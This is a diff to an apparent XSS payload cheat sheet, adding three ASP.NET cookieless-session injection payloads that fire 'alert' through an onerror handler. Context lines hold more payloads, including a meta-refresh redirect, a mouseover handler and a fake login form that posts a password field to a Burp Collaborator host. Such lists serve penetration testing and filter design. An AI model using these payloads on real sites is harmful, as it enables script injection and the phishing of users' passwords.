@@ -225,6 +225,9 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   %22%27%22%3E%3CMETA%20HTTP-EQUIV%3Drefresh%20CONTENT%3D1%3E%3F%3D
   <form action="@collaberator.burpcollaborator.net">Password:<br><input name="p"><br><input type="submit" value="Join meet"></form><\!--
   <a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>
+  /(A('onerror=%22alert%601%60%22testabcd))/
+  /Orders/(A(%22onerror='alert%60xss%60'testabcd))/Login.aspx?ReturnUrl=/Orders
+  (A(%22onerror='alert%601%60'testabcd))/Login.aspx?ReturnUrl=%2f
   ```
 </details>
 
